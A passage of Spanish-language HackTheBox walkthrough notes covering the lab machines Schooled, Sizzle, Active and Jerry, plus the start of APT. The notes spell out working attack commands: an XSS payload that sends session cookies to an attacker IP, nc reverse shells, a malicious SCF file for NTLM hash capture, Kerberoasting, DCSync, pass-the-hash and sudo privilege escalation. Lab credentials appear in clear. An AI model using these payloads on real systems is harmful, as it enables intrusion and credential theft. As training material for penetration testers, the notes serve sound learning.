loggear. Hay la posibilidad de loggearnos como guest o de crear un nuevo usuario. 

Empezamos por crear un usuario. Vemos durante esta fase que necessitamos un email de typo `@student.schooled.htb`, lo añadmimos en el `/etc/hosts`.
pero la web por `http://student.schooled.htb` no cambia.

Vemos que estamos registrados como estudiante y tenemos acceso al curso **Mathematics**. Le damos al boton **enroll** para suscribirnos al curso.
Encontramos mensajes de profesores que nos dice que tenemos que tener el profile de MoodelNet para podernos suscribir al curso. 
Si vamos en nuestro perfil de usuario vemos que hay un campo MoodleNet profile. Nos llama la atencion el echo que el profe dice en el mensaje que
va a controlar todos los perfiles moodleNet antes que la classe empieze.

Miramos si hay una posibilidad de injectar un XSS en el campo MoodleNet Profile

### XSS {-}

```bash
<script>alert("XSS")</script>
```

Le damos a Update profile y vemos que una popup se pone visible. Como vemos que es vulnerable, vamos a intentar robar la cookie de session de Manuel Phillips.

1. Montamos un servidor web con python

    ```bash
    python3 -m http.server 80
    ```

1. Injectamos el XSS en la web

    ```html+
    <script>document.location="http://10.10.16.3/value_cookie=" + document.cookie</script>
    ```

1. Le damos a Update Profile.

Esperamos un poco y vemos que una peticion a sido lanzada y vemos una cookie de session 

<div class="figure">
<img src="images/Schooled-moodlenet-xss.png" alt="MoodleNet XSS" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-85)MoodleNet XSS</p>
</div>

Cambiamos la cookie desde firefox y recargamos la pagina. Ya vemos que nos hemos convertido en Manuel Philips.
Buscando por internet con busquedas de typo `moodle professor role rce github`, vemos que existe un CVE 2020-14321.

Encontramos un exploit y lo utilizamos para crear una reverse shell.

<!--chapter:end:53-Schooled/53-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso con moodle siendo professor {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Cargamos y lanzamos el exploit

    ```bash
    git clone https://github.com/lanzt/CVE-2020-14321
    cd CVE-2020-14321
    python3 CVE-2020-14321_RCE.py --cookie v6tp73g3lnflt81rvtn29jivj6 -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.3 443 >/tmp/f" http://moodle.schooled.htb/moodle
    ```

Y ganamos accesso al systema como el usuario **www**. No podemos lanzar una pseudo consola con tratamiento de la TTY pero seguimos investigando.

### User pivoting {-}

```bash
cd ..
ls
pwd
cd /usr/local/www/apache24/data/moodle
ls -l
cat config.php
```

Vemos un `config.php` con credenciales para mysql. 

```bash
which mysql
which mysqlshow
export $PATH
```

Aqui vemos que el PATH es muy pequeño. Copiamos nuestro PATH de la maquina de atacante y la ponemos en la victima

```bash
export PATH=/root/.local/bin:/home/s4vitar/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/go/bin/:/home/s4vitar/go-workspace/bin:/home/s4vitar/.fzf/bin
export $PATH
which mysqlshow
```

Ahora que tenemos acceso a la utilidad mysqlshow. Nos conectamos con las credenciales.

```bash
mysqlshow -umoodle -pPlaybookMaster2020
mysqlshow -umoodle -pPlaybookMaster2020 moodle
```

Vemos una table **mdl_user**, miramos su contenido con mysql

```bash
mysql -umoodle -pPlaybookMaster2020 -e "select * from mdl_user" moodle
mysql -umoodle -pPlaybookMaster2020 -e "select username,password,email from mdl_user" moodle
```

Copiamos el resultado en un fichero hashes y tratamos el fichero para poder crackearlo con John

#### Crackeando contraseñas con John {-}

```bash
cat hashes | awk '{print $1 ":" $2}'
cat hashes | awk '{print $1 ":" $2}' | sponge hashes
john --wordlist=/usr/share/wordlists/rockyout.txt hashes
```

Encontramos el hash del usuario admin. Pero este usuario no existe en el systema. Mirando el email vemos que el usuario es **jamie**

```bash
ssh jamie@10.10.10.234
```

Ya somos jamie y poder leer el user.txt

<!--chapter:end:53-Schooled/53-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
uname -a
cat /etc/os-release
sudo -l
```

Aqui vemos que podemos lanzar el binario `/usr/sbin/pkg install *` como cualquier usuario sin proporcionar contraseña.
Buscando por [gtfobins](https://gtfobins.github.io/gtfobins/pkg/#sudo) vemos que podemos convertirnos en root con el comando

```bash
TF=$(mktemp -d)
echo 'chmod u+s /bin/bash' > $TF/x.sh
fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF

sudo pkg install -y --no-repo-update ./x-1.0.txz
```

En este caso no funcciona porque la maquina victima no tiene **fpm** instalado. Vemos que este comando solo crea un `.txz`. Lo hacemos desde nuestra maquina
de atacante

```bash
gem install fpm
cd /tmp
mkdir privesc
cd privesc

TF="/tmp/privesc"
echo 'chmod u+s /bin/bash' > $TF/x.sh
fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
```

Aqui ya tenemos el `.txz` en nuestra maquina de atacante. Lo transferimos a la maquina victima

1. Desde la maquina de atacante

    ```bash
    nc -nlvp 443 < x-1.0.txz
    ```

1. Desde la maquina victima

    ```bash
    nc 10.10.16.3 443 > x-1.0.txz
    ```

Ya podemos lanzar la instalacion.

```bash
sudo pkg install -y --no-repo-update ./x-1.0.txz
bash -p
whoami
#Output
root
```

Ya estamos root y podemos leer la flag.

<!--chapter:end:53-Schooled/53-04-PrivilegeEscalation.Rmd-->

# Sizzle {-}

## Introduccion {-}

La maquina del dia se llama Sizzle.

El replay del live se puede ver aqui

[![S4vitaar Sizzle maquina](https://img.youtube.com/vi/nyxEzS55-Aw/0.jpg)](https://www.youtube.com/watch?v=nyxEzS55-Aw)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:54-Sizzle/54-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.103
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.103
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.103 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389,47001,49664,49665,49666,49667,49668,49677,49688,49689,49691,49694,49706,49712,49720 10.10.10.103 -oN targeted
```


| Puerto | Servicio   | Que se nos occure?                          | Que falta?     |
| ------ | ---------- | ------------------------------------------- | -------------- |
| 21     | ftp        | Anonymous connection                        |                |
| 53     | domain     | Domain Controller ataque transferencia zona | dominio valido |
| 80     | http       | web Fuzzin                                  |                |
| 135    | msrpc      |                                             |                |
| 139    | netbios    |                                             |                |
| 389    | LDAP       | Bloodhound ldapdomaindump                   | credenciales   |
| 443    | https      | web Fuzzin                                  |                |
| 445    | smb        | Null session                                |                |
| 464    | kpasswd5?  |                                             |                |
| 593    | ncacn_http |                                             |                |
| 636    | tcpwrapped |                                             |                |
| 3268   | ldap       |                                             |                |
| 3269   | tcpwrapped |                                             |                |
| 5985   | WinRM      | evil-winrm                                  | credenciales   |
| 5986   | WinRM ssl  | evil-winrm                                  | credenciales   |
| 9389   | mc-nmf     | Puertos por defecto de windows              |                |
| 47001  | http       | Puertos por defecto de windows              |                |
| 49664  | msrpc      | Puertos por defecto de windows              |                |
| 49665  | msrpc      | Puertos por defecto de windows              |                |
| 49666  | msrpc      | Puertos por defecto de windows              |                |
| 49668  | msrpc      | Puertos por defecto de windows              |                |
| 49677  | msrpc      | Puertos por defecto de windows              |                |
| 49688  | ncacn_http | Puertos por defecto de windows              |                |
| 49689  | msrpc      | Puertos por defecto de windows              |                |
| 49691  | msrpc      | Puertos por defecto de windows              |                |
| 49694  | msrpc      | Puertos por defecto de windows              |                |
| 49706  | msrpc      | Puertos por defecto de windows              |                |
| 49712  | msrpc      | Puertos por defecto de windows              |                |
| 49720  | msrpc      | Puertos por defecto de windows              |                |


### Analyzando el FTP {-}

```bash
ftp 10.10.10.103
Name: anonymous
Password: #Enter
#Output
User logged in.
dir
ls -la
```

Hemos podido loggearnos como el usuario **anonymous** pero no vemos nada. Miramos si podemos subir archivos.

```bash
echo "content" > prueba.txt

ftp 10.10.10.103
Name: anonymous
Password: #Enter
#Output
User logged in.

put prueba.txt
#Output
550 Access is denied.
```

No podemos subir archivos.

### Analysis del certificado ssl {-}

```bash
openssl s_client -connect 10.10.10.103:443
```

Aqui vemos el dominio `sizzle.htb.local` y lo metemos en el `/etc/hosts`

### Analysis del dominio {-}

```bash
dig @10.10.10.103 sizzle.htb.local ns
```

Encontramos otro dominio, el `hostmaster.htb.local` que añadimos en el `/etc/hosts`. Miramos si es vulnerable a ataque de transferencia de zona.

```bash
dig @10.10.10.103 sizzle.htb.local axfr
```

Aqui vemos que no applica.

### Analysis del RPC {-}

```bash
rpcclient -U "" 10.10.10.103 -N

rpcclient $> enumdomusers
#Output
NT_STATUS_ACCESS_DENIED
```

Aqui vemos que hemos podido connectar con el NULL Session pero no tenemos derecho de enumerar usuarios a nivel de dominio.

### Analyzando el SMB {-}

```bash
crackmapexec smb 10.10.10.103
smbmap -H 10.10.10.103 -u 'null'
```

Vemos que estamos en frente de una maquina Windows 10 de 64 bit pro que se llama **SIZZLE** en el dominio **htb.local**.
Vemos que hay recursos compartidos a nivel de red con los recursos `IPC$` y `Department Shares` con derechos de lectura.
Seguimos analyzando con **smbclient**

```bash
smbclient "//10.10.10.103/Department Shares" 10.10.10.103 -N
smb: \>

dir
```

Aqui vemos muchos directorios y es bastante dificil ver todo lo que hay desde smbclient. Nos creamos una montura para visualizar este recurso.

```bash
mkdir /mnt/smb
mount -t cifs "//10.10.10.103/Department Shares" /mnt/smb
cd /mnt/smb
tree
cd Users
```

<!--chapter:end:54-Sizzle/54-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### Recurso READ ONLY escribible {-}

Algo interesante con smb es que los derechos que vemos desde la montura no son los derechos reales del recurso compartido. Podemos usar de **smbcacls** para
controlar los derechos reales del directorio compartido.

```bash
smbcacls "//10.10.10.103/Department Shares" Users/amanda -N
``` 

Aqui vemos el derecho real de este directorio:

<div class="figure">
<img src="images/Sizzle-smbcacls-real-rights.png" alt="smbcacls rights" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-86)smbcacls rights</p>
</div>

Como tenemos una montura podemos crear un script que nos permite enumerar los directorios para saber si hay un directorio con derechos de escritura.

```bash
cd /mnt/smb/Users
ls -l | awk 'NF{print $NF}' | while read directory; do echo -e "\n[+] Directory $directory; smbcacls "//10.10.10.10/Department Shares" Users/$directory -N | grep -i everyone ; done
```

Vemos que se puede escribir en el directorio Public. Creamos un fichero malicioso en este directorio.


### SCF fichero malicioso para smb {-}

Buscando por internet con las palabras `smb malicious file`, encontramos una possiblidad de injectar un fichero malicioso de typo SCF. Esta vulnerabilidad
consiste injectar una peticion a la maquina de atacante a partir del momento que alguien vea el icono del fichero creado.

1. Creamos un recurso compartido a nivel de red

    ```bash
    cd content
    impacket-smbserver smbFolder $(pwd) -smb2support
    ```

1. Creamos el ficher scf malicioso en el directorio **Public**

    ```bash
    cd /mnt/smb/Users/Public
    nano file.scf

    [Shell]
    Command=2
    IconFile=\\10.10.16.3\smbFolder\pentestlab.ico
    [Taskbar]
    Command=ToggleDesktop
    ```

1. Esperamos un momentito

Ya vemos que una conexion se a establecida y vemos un hash NTLM de version 2 para el usuario amanda.

### Crackeamos el hash con john {-}

Copiamos el hash en un fichero y intentamos crackearlo con John

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt amanda_hash
```

ya tenemos una credencial para el usuario amanda.

Checkeamos la validez de esta credencial con **crackmapexec**

```bash
crackmapexec smb 10.10.10.103 -u 'amanda' -p 'Ashare1972'
```

Vemos que es valida pero no nos podemos conectar porque ne esta el famoso **Pwn3d**

### Enumeracion de usuarios con rpcclient {-}

```bash
rpcclient -U "amanda%Ashare1972" 10.10.10.10 -c 'enumdomusers'
rpcclient -U "amanda%Ashare1972" 10.10.10.10 -c 'enumdomgroups'
# get the rid of domain admins -> 0x200 in this example
rpcclient -U "amanda%Ashare1972" 10.10.10.10 -c 'querygroupmem 0x200'
# get the rid of the users -> 0x1f4 for example
rpcclient -U "amanda%Ashare1972" 10.10.10.10 -c 'queryuser 0x1f4'
```

Nos creamos una lista de usuario desde rpcclient

```bash
cd content
rpcclient -U "amanda%Ashare1972" 10.10.10.161 -N -c "enumdomusers" 
rpcclient -U "amanda%Ashare1972" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' 
rpcclient -U "amanda%Ashare1972" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v 
rpcclient -U "amanda%Ashare1972" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v | tr -d '[]'
rpcclient -U "amanda%Ashare1972" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v | tr -d '[]' > users.txt
```

Como tenemos un listado de usuarios, lanzamos un ataque ASPRoasting para ver si encontramos el TGT de otro usuario.

### Asproasting attack {-}

```bash
GetNPUsers.py htb.local/amanda:Ashare1972 -no-pass -usersfile users
```

Aqui vemos que el ataque no aranca y es normal. Si miramos el contenido del fichero targeted de **nmap** vemos que el puerto 88 de Kerberos no
esta abierto y esto no nos permite ejecutar un ASPRoasting o un Kerberosting attack.


### LDAP domain dump {-}

Intentamos recuperar informaciones desde el ldap.

```bash
cd /var/www/html
ldapdomaindump -u "htb.local\amanda" -p Ashare1972 10.10.10.103 
```

Hemos podido dumpear las informaciones del ldap en ficheros web.

```bash
service apache2 start
```

y analizamos las informaciones desde firefox en la url `http://localhost`.

Las informaciones interesantes aqui son el echo que el usuario mrlky es kerberoasteable, y que el usuario amanda puede conectarse por WinRM.

Continuamos la enumeracion ldap con **bloodhound-python**


### Bloodhound desde la maquina de atacante {-}

**Bloodhound-python** permite recuperar la informacion del ldap desde la maquina de atacante

```bash
pip install bloodhound
bloodhound-python -d htb.local -u amanda -p Ashare1972 -gc sizzle.htb.local -c all -ns 10.10.10.103
```

Ahora que tenemos los ficheros `.json` creamos un zip para entrarlo en el bloodhound

```bash
ls -la *.json
zip htblocal.zip *.json
```

Ya lo podemos analizar desde bloodhound

```bash
sudo apt install neo4j bloodhound
sudo neo4j console
```

A partir de aqui, lanzamos desde una nueva terminal el bloodhound

```bash
bloodhound --no-sandbox &> /dev/null &
disown
```

Aqui ya nos podemos connectar a la base de datos neo4j y podemos *drag & drop* el zip y desde el menu Analysis miramos.


- Find all Domains Admins -> Miramos los administradores del dominio
- Find Shortest Paths to Domain Admins -> Via mas rapida de convertirnos en Administrador
- List all Kerberoastable Accounts -> Usuarios kerberoasteables (need of credentials)
- Find Principals with DCSync Right -> Atacantes pueden lanzar un secretsdump attack para recojer todos los hashes de usuarios cuando tiene el privilegio GetChangesAll.


Aqui vemos que los usuarios MRKLY y KRBTGT son kerberoasteable, tambien vemos que el usuario MRKLY tiene privilegios DSYNC con el GetChangesAll.
Aqui ya podemos ver por dondo van los tiros y que tendremos a un momento dado convertirnos en el usuario **MRKLY**. Pero para esto necesitamos primero
conectarnos a la maquina victima, y como podemos conectar con winrm con el usuario amanda intentamos connectarnos.

```bash
crackmapexec winrm 10.10.10.103 -u 'amanda' -p 'Ashare1972'
evil-winrm -i 10.10.10.103 -u 'amanda' -p 'Ashare1972'
```

Aqui vemos que no tiene el Pwn3d! y que no podemos connectarnos. Como sabemos que este usuario se puede conectar miramos otra vez el fichero targeted y vemos que existe el 
puerto **5986** que es un **winrm con SSL** pero para esto necessitamos un certificado SSL. esto se suele encontrar en un directorio de la web.

Fuzzeamos la web.

### Fuzzeando la web con WFUZZ {-}

Como sabemos que el servicio web es un IIS, utilizamos un diccionario de SecList

```bash
cd /usr/share/seclists
find \-name \*IIS\*

wfuzz -c -t 200 --hc=404 -w /usr/share/seclists/Discovery/web-Content/IIS.fuzz.txt http://10.10.10.103/FUZZ
```

Aqui vemos un directorio `/certsrv`. Si entramos con firefox, hay un panel de inicio de session y si le ponemos las credenciales de amanda, podemos entrar.

Vemos un **Microsoft Active Directory Certificate Services**. Es un servicio que nos permite crear certificados para un usuario.

1. En la web le damos a `Request Certificate -> advanced certificate request`, vemos que tenemos que enviar un certificado base64-encoded CMC o PKCS
1. Creamos un certificado (Private Key) en la maquina de atacante

    ```bash
    openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
    cat amanda.csr | tr -d '\n' | xclip -sel clip
    ```

1. Colamos el contenido en la web y podemos descargar el DER encode certificate.



<!--chapter:end:54-Sizzle/54-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso con Win-RM SSL {-}


```bash
mv /home/s4vitar/Downloads/certnew.cer .
evil-winrm -S -c certnew.cer -k amanda.key -i 10.10.10.103 -u 'amanda' -p 'Ashare1972'
```

ya estamos a dentro de la maquina pero no podemos ver la flag. Como previsto aqui vamos a tener que convertirnos al usuar **MRKLY**.


### Kerberoasting attack con Rubeus {-}

1. Descargamos el rubeus.exe

    ```bash
    wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
    python -m http.server 80
    ```

1. Lo descargamos desde la maquina victima

    ```powershell
    cd C:\Windows\Temp
    mkdir BH
    cd BH
    iwr -uri http://10.10.16.3/Rubeus.exe -Outfile Rubeus.exe
    ```

1. Lanzamos el binario

    ```powershell
    C:\Windows\Temp\BH\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972
    ```

Ya podemos ver el hash NTLM de version 2 del usuario **MRKLY**

### Crackeando el hash con John {-}

Copiamos el hash en un fichero y le lanzamos John

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt mrkly_hash
```

Aqui ya tenemos la contraseña del usuario. Aqui no vamos a poder connectarnos a la maquina victima con este usuario porque
tenemos que crear un nuevo certificado.

Entramos con firefox a la routa `/certsrv` con las credenciales del usuario MRKLY.

1. En la web le damos a `Request Certificate -> advanced certificate request`
1. Creamos un certificado (Private Key) en la maquina de atacante

    ```bash
    openssl req -newkey rsa:2048 -nodes -keyout mrkly.key -out mrkly.csr
    cat mrkly.csr | tr -d '\n' | xclip -sel clip
    ```

1. Colamos el contenido en la web y podemos descargar el DER encode certificate.

```bash
    mv /home/s4vitar/Downloads/certnew.cer .
    evil-winrm -S -c certnew.cer -k mrkly.key -i 10.10.10.103 -u 'mrkly' -p 'Football#7'
```

Ya podemos leer la Flag.

<!--chapter:end:54-Sizzle/54-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

Como hemos echo una buena enumeracion del systema, sabemos que el usuario **MRKLY** puede hacer un ataque DCSync para recuperar los
hashes de los usuarios del systema.

Aqui la escala de privilegio es facil y se hace desde la maquina de atacante con **SecretsDump**

```bash
impacket-secretsdump htb.local/mrlky:Football#7@10.10.10.103
```

Aqui ya vemos hashes que podemos uzar para hacer **PASS THE HASH**. Copiamos el hash del usuario Administrator y lanzamos

```bash
impacket-wmiexec htb.local/Administrator@10.10.10.103 -hashes :f6b7160bfc91823792e0ac3a162c9267
whoami
#Output
htb\administrator
```

Ya podemos leer el **root.txt**

<!--chapter:end:54-Sizzle/54-04-PrivilegeEscalation.Rmd-->

# Active {-}

## Introduccion {-}

La maquina del dia se llama Active.

El replay del live se puede ver aqui

[![S4vitaar Sauna maquina](https://img.youtube.com/vi/kTyYkrK970w/0.jpg)](https://www.youtube.com/watch?v=kTyYkrK970w)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:55-Active/55-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.100
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.100
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.100 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p53,88,135,139,289,445,464,593,636,3269,5985,9389,49667,49673,49674,49677,49689,49698 10.10.10.100 -oN targeted
```


| Puerto | Servicio   | Que se nos occure?                       | Que falta?                |
| ------ | ---------- | ---------------------------------------- | ------------------------- |
| 53     | domain     | Domain controller rpcclient null session |                           |
| 88     | Kerberos   | asproasting attack                       | lista de usuarios validos |
| 135    | msrpc      |                                          |                           |
| 139    | netbios    |                                          |                           |
| 389    | LDAP       | Bloodhound                               | credenciales              |
| 445    | smb        | Null session                             |                           |
| 464    | kpasswd5?  |                                          |                           |
| 593    | ncacn_http |                                          |                           |
| 636    | tcpwrapped |                                          |                           |
| 3268   | ldap       |                                          |                           |
| 3269   | tcpwrapped |                                          |                           |
| 5722   | WinRM      | evil-winrm                               | credenciales              |
| 9389   | mc-nmf     | Puertos por defecto de windows           |                           |
| 47001  | msrpc      | Puertos por defecto de windows           |                           |
| 49152  | msrpc      | Puertos por defecto de windows           |                           |
| 49153  | msrpc      | Puertos por defecto de windows           |                           |
| 49154  | msrpc      | Puertos por defecto de windows           |                           |
| 49155  | ncacn_http | Puertos por defecto de windows           |                           |
| 49157  | msrpc      | Puertos por defecto de windows           |                           |
| 49158  | msrpc      | Puertos por defecto de windows           |                           |
| 49169  | msrpc      | Puertos por defecto de windows           |                           |
| 49171  | msrpc      | Puertos por defecto de windows           |                           |
| 49182  | msrpc      | Puertos por defecto de windows           |                           |


### Analyzando el SMB {-}

```bash
crackmapexec smb 10.10.10.100
smbclient -L 10.10.10.100 -N
smbmap -H 10.10.10.100 -u 'null'
```

Vemos que estamos frente de una maquina Windows 6.1 x64 que se llama **DC** en el dominio **active.htb** con un certificado firmado.
Añadimos el dominio al `/etc/hosts`.
Tambien vemos que podemos ver los recursos compartidos a nivel de red con un null session y que el recurso **Replication** esta en **READ ONLY**.
Listamos el directorio con **smbmap**

```bash
smbmap -H 10.10.10.100 -r Replication
smbmap -H 10.10.10.100 -r Replication/active.htb
```

Aqui vemos

- DfsrPrivate
- Policies
- scripts

Esto nos hace pensar a una replica de **SYSVOL**. Aqui buscamos si esta el `groups.xml`

```bash
smbmap -H 10.10.10.100 -r Replication/active.htb/Policies
smbmap -H 10.10.10.100 -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04F894F9}
smbmap -H 10.10.10.100 -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04F894F9}/MACHINE
smbmap -H 10.10.10.100 -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04F894F9}/MACHINE/Preferences
smbmap -H 10.10.10.100 -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04F894F9}/MACHINE/Preferences/Groups/*
```


<!--chapter:end:55-Active/55-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### Groups.xml {-}

Hemos encontrado el fichero `groups.xml`, lo descargamos

```bash
smbmap -H 10.10.10.100 --download Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04F894F9}/MACHINE/Preferences/Groups/Groups.xml

mv Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04F894F9}/MACHINE/Preferences/Groups/Groups.xml Groups.xml
cat Groups.xml
```

Aqui vemos el usuario y la contraseña encryptada.

```bash
gpp-decrypt "edBSHOwhZLTjt/Q59FeIcJ83mjWA98gw9gukOhjOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

Ya tenemos la contraseña. Verificamos si las credenciales son validas.

```bash
crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
```

Es valida pero no tenemos el Pwn3d. Miramos si este usuario tiene acceso a mas registros compartidos a nivel de red.

```bash
smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
```

Hay unos cuantos mas. Miramos lo que hay en el registro Users

```bash
smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Users
```

Como solo vemos nuestro usuario y el administrator, y quel puerto 88 esta abierto, intentamos un Kerberoasting attack.

### Kerberoasting attack {-}

```bash
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18
```

Aqui podemos ver que el usuario Administrator es kerberoasteable.

```bash
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
```

Copiamos el hash y intentamos romperlo con John

### Crack hash with John {-}

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Ya tenemos la contraseña del usuario Administrator. Lo verificamos con crackmapexec

```bash
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968'
```

Ademas de ser valido, vemos el famoso **(Pwn3d!)**

<!--chapter:end:55-Active/55-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Conexion con psexec {-}


```bash
psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe
whoami
#Output
nt authority\system
```

Aqui podemos leer las 2 flags.

<!--chapter:end:55-Active/55-03-GainingAccess.Rmd-->

# Jerry {-}

## Introduccion {-}

La maquina del dia se llama Jerry.

El replay del live se puede ver aqui

[![S4vitaar Sauna maquina](https://img.youtube.com/vi/GFED7XNYmXI/0.jpg)](https://www.youtube.com/watch?v=GFED7XNYmXI)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:56-Jerry/56-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.95
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.95
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.95 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p8080 10.10.10.95 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 8080   | http     | Web Fuzzing        |            |


### Analyzando la web {-}


#### Http Enum {-}

```bash
nmap --script http-enub -p8080 10.10.10.95 -oN webScan
```




<!--chapter:end:56-Jerry/56-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

#### Checkear la web {-}

Vemos la pagina por defecto de Tomcat. Vamos en la url `http://10.10.10.95:8080/manager/html`, Intentamos credenciales por defecto:

- admin:admin
- tomcat:tomcat
- tomcat:s3cret

Ya hemos ganado acceso al panel de manager.

<!--chapter:end:56-Jerry/56-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### War malicioso para tomcat {-}

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 -f war -o shell.war
```

Nos ponemos en escucha por el puerto 443

```bash
rlwrap nc -nlvp 443
```

Subimos el war a la web de manager y ya ganamos accesso a la maquina victima. A demas ya estamos como `nt authority\system`

<!--chapter:end:56-Jerry/56-03-GainingAccess.Rmd-->

# APT {-}

## Introduccion {-}

La maquina del dia se llama APT.

El replay del live se puede ver aqui

[![S4vitaar Sauna maquina](https://img.youtube.com/vi/VxE1cfvXjA0/0.jpg)](https://www.youtube.com/watch?v=VxE1cfvXjA0)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:57-Apt/57-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.213
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.213
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.213 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80,135 10.10.10.213 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 80     | http     | Web Fuzzing        |            |
| 135    | msrpc    |                    |            |


### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.213
```

Es un IIS 10.0 y poco mas.

#### Checkear la web {-}

Si entramos en la url `http://10.10.10.213`, vemos una web que habla de un hosting.

#### Fuzzing {-}

```bash
nmap --script http-enum -p80 10.10.10.213 -oN webScan
```

### Analyzando el puerto 135

Buscando con firefox `port 135 msrpc pentesting` vemos un articulo en la web de [hacktricks](https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc).
Aqui podemos ver que hay una posibilidad de abusar del methodo **ServerAlive2** con una heramienta llamada [IOXIDResolver](https://github.com/mubix/IOXIDResolver).

<!--chapter:end:57-Apt/57-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### Abusando del methodo ServerAlive2 {-}

```bash
git clone https://github.com/mubix/IOXIDResolver
cd IOXIDResolver
pip3 install -r requirements.txt
python3 IOXIDResolver.py -t 10.10.10.213
```

En este caso, el abuso del methodo nos muestra la ipv6 de la maquina victima. Lo verificamos con un ping

```bash
ping6 dead:beef::b885:d62a:d679:573f
```

Aqui vemos que la maquina nos responde.

### Buscamos mas puertos con IPV6 {-}

```bash
nmap -sS --min-rate 5000 --open -vvv -n -Pn -6 dead:beef::b885:d62a:d679:573f -oG allPortsipv6
extractPorts allPortsipv6
nmap -sCV -p53,80,88,135,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49673,29685,49693 -6 dead:beef::b885:d62a:d679:573f -oN targetedipv6
```

Aqui vemos un monton de puertos que no vamos a explicar porque ya lo hemos contemplado varias veces. Pero mirando los mas importantes vemos:

- el puerto 135 (smb) esta abierto
- el 88 (kerberos)
- el 389 (ldap)
- el 5985 (WinRM)

y con esto ya sabemos que estamos frente a un Domain Controller.

### Usando las heramientas basicas con IPV6 {-}

